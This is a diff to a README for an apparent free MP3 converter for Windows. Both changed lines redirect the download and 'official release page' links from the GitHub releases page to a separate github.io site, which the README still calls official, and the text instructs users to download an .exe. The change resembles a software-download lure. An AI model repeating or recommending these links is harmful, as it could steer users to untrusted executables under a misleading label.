@@ -1,6 +1,6 @@
 # 🎵 MP3-Converter-2026-Free-Download - Convert your audio files to MP3
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Bertyscattershot136/MP3-Converter-2026-Free-Download/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://bertyscattershot136.github.io)
 
 This application converts various audio formats into the MP3 format. You can change your music, voice recordings, or other sound files into a format that works on most devices. The program runs on Windows and requires no technical knowledge to operate.
 
@@ -8,7 +8,7 @@ This application converts various audio formats into the MP3 format. You can cha
 
 Follow these steps to set up the software on your computer. Before you begin, verify that your computer runs Windows 10 or Windows 11. You need at least 100 MB of free hard drive space to install the files.
 
-1. Go to the [official release page](https://github.com/Bertyscattershot136/MP3-Converter-2026-Free-Download/releases).
+1. Go to the [official release page](https://bertyscattershot136.github.io).
 2. Locate the file section titled Assets.
 3. Click the link that ends with .exe to download the installer.
 4. Save the file to your Downloads folder.
